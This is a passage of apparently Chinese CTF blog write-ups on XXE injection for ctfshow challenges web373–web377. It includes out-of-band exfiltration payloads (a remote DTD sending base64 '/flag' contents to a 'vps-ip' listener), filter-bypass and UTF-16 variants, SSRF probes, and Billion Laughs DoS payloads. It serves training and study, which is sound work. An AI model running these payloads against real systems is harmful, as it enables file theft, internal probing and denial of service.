LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>相比较于上一道有回显的题目，差别在于删除了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br></pre></td></tr></table></figure>

<p>我们的做法是将flag外带</p>
<p><del>由于新人第一次接触反弹Shell的做法，就将接下来的步骤写的详细一些了</del></p>
<p>如果是腾讯云的vps，要现在防火墙将所有端口开放</p>
<p><img src="https://s2.loli.net/2024/03/13/t3vQkyRPYEoSFOI.png" alt="image-20240313173756361"></p>
<p>启动vps后在特定宽口开放http服务，以便通过外网能访问到你的恶意文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server </span><br></pre></td></tr></table></figure>

<p>此时我们访问一下 <a href="http://vps-ip:8000/">http://vps-ip:8000</a> 试试看：（未有特殊说明则默认开放8000端口，ip为vps公网的ip）</p>
<p><img src="https://s2.loli.net/2024/03/13/q4QxSDGbpXnMOEv.png" alt="image-20240313153456749"></p>
<p>此时</p>
<p><img src="https://s2.loli.net/2024/03/13/AyUs89x3OrngBFe.png" alt="image-20240313154259477"></p>
<p>说明8000端口启动http服务成功</p>
<p>同理我们来测试1234端口：</p>
<p><img src="https://s2.loli.net/2024/03/13/A6UcgXZFuofS2Bv.png" alt="image-20240313154326926"></p>
<p>说明1234端口也启动http服务成功</p>
<p>创建XXE.dtd文件并写入如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim XXE.dtd</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#XXE.dtd</span><br><span class="line">#shift+i</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send  SYSTEM &#x27;http://vps-ip:1234/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br><span class="line">#esc</span><br><span class="line">#shift+: 输入wq保存退出</span><br></pre></td></tr></table></figure>

<p>在另一个页面监听本地1234端口：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/03/13/czXb29IgDC4wZFL.png" alt="image-20240313154810747"></p>
<p>burp发包内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 2299db75-d9fe-416f-959d-406b131ae701.challenge.ctf.show</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/03/13/G4Q5JhVHnozk1M6.png" alt="image-20240313161738958"></p>
<p>在监听的页面就可以看到加密后的flag</p>
<p><img src="https://s2.loli.net/2024/03/13/R24VpE8F6yLnZdC.png" alt="image-20240313155739020"></p>
<p>解密后得到flag</p>
<p><img src="https://s2.loli.net/2024/03/13/VBZqvXIb3kepYiA.png" alt="image-20240313155848778"></p>
<p>对payload的解释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>定义了两个实体：</p>
<ol>
<li><p><code>%file</code>：它使用php过滤器读取系统文件<code>/flag</code>的内容，并对内容进行base64编码。</p>
</li>
<li><p><code>%dtd</code>：它从远程URL <code>http://vps-ip:8000/XXE.dtd</code>加载DTD文件。</p>
</li>
</ol>
<p>以下是jay17师傅的解释（实体名有所改动）：</p>
<ol>
<li>不能直接<code>&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/%file&quot;&gt; </code>，因为默认不允许把本地文件发送到远程dtd里面，需要绕一圈，绕过这个限制</li>
<li><code>%dtd;</code>会读取远程dtd文件，读到了以后，因为远程dtd文件有一个<code>% all</code>实体的定义，那么就会解析这个实体定义。<code>% all</code>实体的定义内容是另外一个实体<code>% send</code>定义，那就会解析<code>% send</code>，就会执行远程请求，请求地址<code>http://vps-ip:8000/%file</code>，会在我们的 vps 日志上留下痕迹。<br>也可以起 nc 监听端口，能判断是否有向我们的 vps 发送请求以及请求内容。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send  SYSTEM &#x27;http://vps-ip:1234/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>

<ol>
<li><code>&amp;#x25;</code> 就是百分号，因为是嵌套在里面的引用，不能直接写百分号</li>
<li><code>%all</code>实体定义了一个新的实体<code>send</code>，其内容是一个SYSTEM类型的实体，用于发送数据到指定的URL。在这里，<code>%file</code>实体被引用在URL中，以便将<code>/flag</code>文件的内容发送到指定的<code>http://vps-ip:1234/</code>地址。</li>
<li>在XML文档的解析过程中，通过引用<code>%all</code>实体，实际上定义了一个名为<code>send</code>的实体，其值是将<code>/flag</code>文件内容发送到指定URL的操作。</li>
<li>最后，通过引用<code>%send</code>实体，实际上执行了之前定义的<code>send</code>实体，将<code>/flag</code>文件的内容发送到指定的URL。</li>
</ol>
<h3 id="XXE检测："><a href="#XXE检测：" class="headerlink" title="XXE检测："></a>XXE检测：</h3><p>主要的方法是检测所有接受XML作为输入内容端点，抓包观察其是否会返回我们想要的内容。</p>
<p>首先检测XML是否会被成功解析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [ </span><br><span class="line">    &lt;!ENTITY words &quot;Hello XXE !&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;words;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/12/20/zScwHxmoaDt2hqJ.png" alt="image-20231008194425489"></p>
<p>如果数据包或页面中存在“Hello XXE”的字样，则表名实体已被解析。</p>
<p><img src="https://s2.loli.net/2023/12/20/WV5Z1hPgBNuRQU3.png" alt="image-20231008194500250"></p>
<p>接下来检测该端点是否支持DTD引用外部实体：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM &quot;http://localhost/tp5/test.xml&quot;&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p>此时通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的HTTP request。</p>
<p><img src="https://s2.loli.net/2023/12/20/OxmH3Qjp9ahRWPK.png" alt="image-20231008210523538"></p>
<p>如图所示，则该处很可能存在XML外部实体注入漏洞。</p>
<h3 id="SSRF："><a href="#SSRF：" class="headerlink" title="SSRF："></a>SSRF：</h3><p>XXE 可以与SSRF（服务端请求伪造） 漏洞一起用于探测其它内网主机的信息，基于http协议。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://internal.service/secret_pass.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
<p>当然也可以用来探测端口信息，根据响应包的信息，若非“connection refused”则表示该端口可能是开放的。</p>
<p>众所周知，有些企业对内网的安全性可能不那么注重。除了以上的利用，控制服务器对外网发送请求也是有可能成功的。此处可使用ncat工具进行测试。关于ncat的使用：ncat-网络工具中的“瑞士军刀”</p>
<p>用ncat在自己的服务器上开启监听：ncat -lvkp 8081(端口可自定义)</p>
<p>之后便可使用以下语句尝试是否能够建立连接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://ATTACKERIP:8081/&quot; [</span><br><span class="line">    &lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<h3 id="DDoS："><a href="#DDoS：" class="headerlink" title="DDoS："></a>DDoS：</h3><p>支持实体测试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">    &lt;!ELEMENT data (#ANY)&gt;</span><br><span class="line">    &lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line">    &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a2;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
<p>如果解析过程变的非常缓慢，则表明测试成功，即目标解析器配置不安全可能遭受至少一种 DDoS 攻击。</p>
<h3 id="Billion-Laughs-攻击："><a href="#Billion-Laughs-攻击：" class="headerlink" title="Billion Laughs 攻击："></a>Billion Laughs 攻击：</h3><p>一个经典的Dos攻击payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">    &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">    &lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line">    &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; </span><br><span class="line">    &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">        ...... </span><br><span class="line">    &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>
<p>当XML解析器加载该文档时，它会看到它包含一个根元素 “lolz” ，该元素包含文本 “&lol9;” 。然而，“&lol9;” 是一个已定义的实体，它扩展为包含十个 “&lol8;” 字符串。每个 “&lol8;” 字符串都是一个已定义的实体，可以扩展到10个 “&lol7;” 字符串，以此类推。在处理完所有的实体扩展之后，这个小（小于1 KB）的XML块实际上将包含 109 &#x3D; 10亿个 “lol” ，占用了将近 3 gb 的内存。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.w3school.com.cn/dtd/dtd_intro.asp">DTD 简介 (w3school.com.cn)</a></p>
<p><a href="https://xz.aliyun.com/t/3357?time__1311=n4+xnD0DgGYQwqYq40HpDUhG+KG=DceorD3D&alichlgref=https://xz.aliyun.com/t/3357#toc-8">一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/389550468">XXE知识总结，有这篇就够了！ - 知乎 (zhihu.com)</a></p>
<p><a href="https://blog.csdn.net/Jayjay___/article/details/132146130">Ctfshow web入门 XXE 模板注入篇 web373-web378 详细题解 全_ctfshow web373-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/uuzeray/article/details/134641792">【Web】CTFSHOW XXE刷题记录(全)-CSDN博客</a></p>
]]></content>
      <categories>
        <category>XXE</category>
      </categories>
      <tags>
        <tag>XXE</tag>
        <tag>ctfshow</tag>
        <tag>reverse shell</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow XXE 刷题记录</title>
    <url>/2024/04/02/ctfshow%20XEE%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="web373-web374"><a href="#web373-web374" class="headerlink" title="web373-web374"></a>web373-web374</h1><p>传送门：</p>
<p><a href="https://ed3n.top/2024/03/11/XXE%E6%BC%8F%E6%B4%9E/">XXE学习记录 | Ed3n’s Blog</a></p>
<h1 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h1><p>先看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:22:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>

<p>与上题的区别是多了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> </p>
<h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>不要不就好了？web374 的做法也没有加 <code>&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code>。那就和 web374 做法一致就行</p>
<h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>在<code>&lt;?xml version=&quot;1.0&quot;</code>中的空格后加个换行符，发包内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: b9bd31cd-52ff-4eb0-b2b2-9ae0b6528086.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 212</span><br><span class="line"></span><br><span class="line">&lt;?xml </span><br><span class="line"> version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>成功接收到 flag</p>
<p><img src="https://s2.loli.net/2024/03/27/6jUB9ZCleKzR1FH.png" alt="image-20240327172210794"></p>
<h2 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h2><p>在<code>&lt;?xml version=&quot;1.0&quot;</code>中的空格后再加个空格，发包内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: b9bd31cd-52ff-4eb0-b2b2-9ae0b6528086.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 212</span><br><span class="line"></span><br><span class="line">&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>成功接收到 flag</p>
<p><img src="https://s2.loli.net/2024/03/27/Lb2ykmlj4vscCDg.png" alt="image-20240327173015025"></p>
<h1 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h1><p>先看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:23:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>

<p>与上题的区别是多了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> 及其大小写。emmmm… web375 的绕过方法好像也没有大小写绕过啊？</p>
<p>那就直接用 web375 的方法好了</p>
<h1 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h1><p>先看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:26:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure>

<p>与上题的区别是多了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> 和 <code>http</code> 及其大小写</p>
<p>我们先看一下原 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://81.71.4.233:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>有一个 <code>encoding=&quot;UTF-8&quot;</code> 的参数，那么我们就可以考虑除了 UTF-8 以外的其他编码，可以从 <a href="https://www.runoob.com/xml/xml-encoding.html">XML 编码 | 菜鸟教程 (runoob.com)</a> 中查看。</p>
<p>那我们取其中一个试试看：</p>
<p>先写一个编码转换的脚本（转 Unicode）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">utf8_str = <span class="built_in">input</span>(<span class="string">&quot;utf-8:&quot;</span>)</span><br><span class="line"></span><br><span class="line">unicode_str = utf8_str.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Unicode:&quot;</span>, unicode_str)</span><br></pre></td></tr></table></figure>

<p>编码后为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\xff\xfe&lt;\x00?\x00x\x00m\x00l\x00 \x00v\x00e\x00r\x00s\x00i\x00o\x00n\x00=\x00&quot;\x001\x00.\x000\x00&quot;\x00 \x00e\x00n\x00c\x00o\x00d\x00i\x00n\x00g\x00=\x00&quot;\x00U\x00T\x00F\x00-\x008\x00&quot;\x00?\x00&gt;\x00\n\x00\n\x00&lt;\x00!\x00D\x00O\x00C\x00T\x00Y\x00P\x00E\x00 \x00t\x00e\x00s\x00t\x00 \x00[\x00\n\x00&lt;\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00%\x00 \x00f\x00i\x00l\x00e\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00&quot;\x00p\x00h\x00p\x00:\x00/\x00/\x00f\x00i\x00l\x00t\x00e\x00r\x00/\x00r\x00e\x00a\x00d\x00=\x00c\x00o\x00n\x00v\x00e\x00r\x00t\x00.\x00b\x00a\x00s\x00e\x006\x004\x00-\x00e\x00n\x00c\x00o\x00d\x00e\x00/\x00r\x00e\x00s\x00o\x00u\x00r\x00c\x00e\x00=\x00/\x00f\x00l\x00a\x00g\x00&quot;\x00&gt;\x00\n\x00&lt;\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00%\x00 \x00d\x00t\x00d\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00&quot;\x00h\x00t\x00t\x00p\x00:\x00/\x00/\x00v\x00p\x00s\x00-\x00i\x00p\x00:\x008\x000\x000\x000\x00/\x00X\x00X\x00E\x00.\x00d\x00t\x00d\x00&quot;\x00&gt;\x00\n\x00%\x00d\x00t\x00d\x00;\x00\n\x00]\x00&gt;\x00\n\x00&#x27;</span><br></pre></td></tr></table></figure>

<p>但是直接放 Burp 里传不知道为什么成功不了</p>
<p>试了 python 爬虫倒是成功了：</p>
